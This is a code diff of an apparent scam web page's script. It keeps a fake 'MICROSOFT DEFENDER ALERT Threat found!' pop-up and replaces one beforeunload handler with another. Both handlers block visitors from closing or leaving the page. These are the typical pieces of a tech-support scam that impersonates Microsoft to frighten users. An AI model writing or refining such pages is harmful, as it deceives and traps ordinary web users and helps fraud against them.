@@ -10,15 +10,9 @@
  <script>
 
 		  alert("***MICROSOFT DEFENDER ALERT*** Threat found!");
-	 function onBeforeUnload(e) {
-        e.preventDefault();
-        e.returnValue = '';
-        return;
-
-    delete e['returnValue'];
-}
-
-window.addEventListener('beforeunload', onBeforeUnload);
+    window.onbeforeunload = function(e) {
+       return 'Dialog text here.';
+    };
 		   </script>
 
 
